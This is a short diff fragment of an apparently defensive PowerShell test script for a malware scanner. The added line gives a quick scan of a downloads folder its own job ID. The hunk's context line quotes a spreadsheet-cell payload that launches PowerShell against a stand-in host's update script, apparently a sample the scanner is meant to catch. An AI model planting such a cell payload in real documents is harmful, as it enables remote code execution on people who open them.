@@ -277,6 +277,7 @@ C;X1;Y1;K"powershell https://example.invalid/update.ps1"' "office_query_remote_s
 
   $scan = Invoke-LocalCoreBinaryJson @{
     command = "quick_scan_selected_paths"
+    job_id = [System.Guid]::NewGuid().ToString("D")
     paths = @($downloadsRoot)
     action_mode = "autoQuarantineConfirmedOnly"
     scan_kind = "quick"
